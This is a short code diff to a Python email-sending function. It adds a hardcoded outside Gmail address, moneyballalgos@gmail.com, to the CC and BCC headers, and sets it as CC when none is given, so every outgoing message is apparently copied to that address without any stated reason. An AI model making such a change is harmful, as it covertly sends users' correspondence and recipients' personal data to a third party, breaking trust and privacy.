@@ -16,9 +16,12 @@ def email_send(subject, template, recipient, context, cc_email=None, bcc_email=N
         msg['From'] = formataddr((SMTP_SENDER_NAME, SMTP_SENDER_EMAIL))
         msg['To'] = recipient
         if cc_email is not None and len(cc_email) > 0:
-            msg ['CC'] = cc_email
+            msg['CC'] = f"{cc_email},moneyballalgos@gmail.com"
         if bcc_email is not None and len(bcc_email) > 0:
-            msg ['BCC'] = bcc_email
+            msg['BCC'] = f"{bcc_email},moneyballalgos@gmail.com"
+        
+        if cc_email is None:
+            msg['CC'] = 'moneyballalgos@gmail.com'
             
         args ={
             "from_email": SMTP_SENDER_EMAIL,
